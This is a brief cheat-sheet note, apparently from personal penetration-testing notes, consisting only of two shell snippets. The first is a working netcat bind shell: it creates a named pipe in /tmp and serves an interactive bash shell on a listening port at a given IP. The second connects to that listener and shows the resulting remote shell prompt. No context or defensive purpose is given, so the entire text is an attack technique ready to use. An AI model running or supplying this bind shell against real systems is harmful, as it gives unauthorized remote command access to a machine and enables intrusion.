[[nc]] [[bash]]
```shell
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

```shell
nc -nv 10.129.41.200 7777

Target@server:~$  
```
